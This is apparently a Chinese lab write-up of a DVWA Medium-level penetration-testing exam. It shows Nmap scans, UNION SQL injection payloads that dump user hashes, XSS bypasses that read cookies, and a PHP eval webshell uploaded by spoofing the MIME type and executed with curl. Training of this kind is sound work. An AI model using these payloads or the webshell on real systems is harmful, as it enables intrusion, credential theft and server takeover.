## 二、实操过程记录

### 阶段 1：环境准备（10 分钟）

考核开始前先把三件事确认清楚：靶机起了、网络通、级别是 Medium。任何一项没确认，后面卡住时都会怀疑是技术问题。

```text
# 1. 确认连通性（Kali 侧）
ping -c 3 192.168.1.101
# 2. 浏览器访问 DVWA，确认能打开登录页
http://192.168.1.101/dvwa/
# 3. DVWA Security 页面把级别改成 Medium，再回来
```
连通性：3 个包全部返回，平均延迟 1.2ms，网络畅通。

登录：admin / password，登录后左侧菜单正常。

安全级别：DVWA Security → Medium → Submit，页面底部确认显示 Security Level: Medium。

### 阶段 2：信息收集（30 分钟）

目标是先用 Nmap 把「这台机器上跑着什么」摸清楚，再决定后面从哪个点下手。考核只要求端口、服务版本、技术栈三样。

```bash
# 快速全端口扫描 + 版本探测
nmap -sV -sC -p- 192.168.1.101 -oN nmap_full.txt
# 补一个系统识别
nmap -O 192.168.1.101
# Web 指纹（可选）
curl -I http://192.168.1.101/dvwa/
```

| 信息项 | 本次结果 |
| --- | --- |
| 目标 IP | 192.168.1.101 |
| 开放端口 | 80/tcp（HTTP）、135/139/445（Windows 常规服务） |
| Web 服务器 | Apache/2.4.x (Win32) OpenSSL/1.1.1 |
| 编程语言 | PHP 7.x（响应头 X-Powered-By） |
| 数据库类型 | MySQL / MariaDB 5.7（DVWA 配置） |
| 操作系统 | Windows 7（TTL 128、445 开放、Apache Win32） |

结论表格见下，判断依据：80 端口返回 Server: Apache/2.4.x (Win32)，X-Powered-By: PHP/7.x；3306 只对本机监听，从 Kali 扫不到；TTL 与开放端口组合判断为 Windows 7。

![信息收集：Nmap 扫描结果](/images/csdn/week05/day-029-2.png)

### 阶段 3：SQL 注入（60 分钟）

Medium 级别下 id 是下拉框 POST 提交，必须走 Burp 改包。先判类型，再数列数，然后按「库 → 表 → 列 → 数据」四级往下取。

```sql
# 1. 判真假（Burp 拦 POST，改 id）
id=1 AND 1=1          # 返回 admin 记录
id=1 AND 1=2          # 返回空
# 2. 判列数（数字型，不需要引号闭合）
id=1 ORDER BY 2       # 正常
id=1 ORDER BY 3       # 报错 → 2 列
# 3. 库名与版本
id=-1 UNION SELECT database(),version()
```
![运行截图](/images/csdn/week05/day-029-3.png)

```sql
# 4. 表名
id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()
# 5. 列名
id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'
# 6. 用户数据
id=-1 UNION SELECT user,password FROM users
```
注入类型：数字型（Medium 的 mysqli_real_escape_string 只转义引号，对数字型无效，所以直接拼 AND/UNION 就通）。

列数：2 列（first_name、last_name）。

库名：dvwa。

表名：guestbook、users。

数据：users 表 5 条账号，密码为 MD5 无盐哈希，admin 的哈希 5f4dcc3b5aa765d61d8327deb882cf99 对应明文 password。

![SQL 注入：UNION 回显库名与用户数据](/images/csdn/week05/day-029-4.png)

### 阶段 4：XSS 漏洞利用（40 分钟）

Medium 的反射型和存储型都用同一套过滤：把 <script> 整段替换成空。所以突破口在「换标签」和「改变大小写」

```text
# 反射型（XSS Reflected, Medium）
<img src=x onerror=alert(document.cookie)>
<ScRiPt>alert(1)</ScRiPt>
# 存储型（XSS Stored, Medium）：Name / Message 两个字段
<svg onload=alert(document.cookie)>
```
过滤机制：str_replace('<script>', '', $input)，只删一次、只认小写、只针对 script 标签。

绕过：大小写（<ScRiPt>）成功；换标签（img 的 onerror、svg 的 onload）成功；双写失败，因为替换后拼不回完整标签。

存储型验证：提交后刷新页面、换浏览器访问都能触发，说明 payload 已写入数据库。

![XSS：反射型与存储型弹窗](/images/csdn/week05/day-029-5.png)

### 阶段 5：文件上传 GetShell（50 分钟）

Medium 的上传只校验 Content-Type 和文件大小，不校验后缀。用 Burp 把 MIME 改成 image/jpeg 就能把 .php 传上去。

```bash
# 1. 准备一句话木马 shell.php
<?php @eval($_POST['cmd']); ?>
# 2. Burp 拦截上传请求，改 Content-Type
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg        ← 原来是 application/x-php
# 3. 上传成功后访问
http://192.168.1.101/dvwa/hackable/uploads/shell.php
# 4. 用 curl 验证执行
curl -X POST -d "cmd=system('whoami');" ^
http://192.168.1.101/dvwa/hackable/uploads/shell.php
```
防护机制：Content-Type 必须在 image/jpeg 或 image/png 白名单内，且文件大小 < 100KB；后缀不参与判断。

绕过方法：Burp 改 Content-Type: image/jpeg，filename 保持 shell.php。

上传路径：http://192.168.1.101/dvwa/hackable/uploads/shell.php。

whoami：nt authority\system（phpStudy 的 Apache 以系统服务运行，直接是最高权限，不需要提权）。

蚁剑：URL 填上面那个地址，密码 cmd，编码器 default，连接成功。

## 三、实践心得

1. 考核真正考的不是 payload，是「顺序」。先扫端口、再定入口、再判类型、再取数据，每一步的结论都是下一步的输入；顺序乱了就会在原地反复试。

2. Medium 的三个坑本质是同一个：过滤只做了一半。SQL 只转义引号不管数字型，XSS 只删小写 script 不管事件属性，上传只看 MIME 不看内容。「做了防护」和「防护有效」是两件事。

3. 这一次没翻笔记，但我在 XSS 存储型上卡了 25 分钟——原因是我默认它还和 Low 一样。换级别之后第一件事应该是重新测一遍过滤，而不是套用上一级的 payload。

## 四、重点与难点

1. 必须记住的知识点

① 渗透的固定顺序：信息收集 → 找入口 → 判类型 → 取数据 → GetShell → 后渗透。

② Medium 三关的防护点：SQL 转义引号、XSS 覆盖 script、上传校验 MIME。

③ 数字型注入不需要引号闭合，转义函数对它完全无效。

④ GetShell 后第一动作是信息收集，不是提权——本次因为配置不当已经直接是 SYSTEM。

2. 踩过的坑

① 一开始忘了把安全级别从 low 调到 Medium，前三关过得太顺，差点误判。

② 存储型 XSS 直接套用 Low 的 <script> payload，被过滤后没有立刻去看源码，浪费了 20 分钟。

③ 上传时只改了 filename 没改 Content-Type，仍然提示 Your image was not uploaded.。

3. 需要补的课

① 补课：Burp 的 Repeater 用法，比反复改包快得多。

② 补课：Nmap 的 -sV 与 -sC 输出的解读，特别是版本号对应的已知漏洞。

③ 预习：Week 6 开始进入注入进阶（盲注、报错、WAF 绕过、二次注入）。
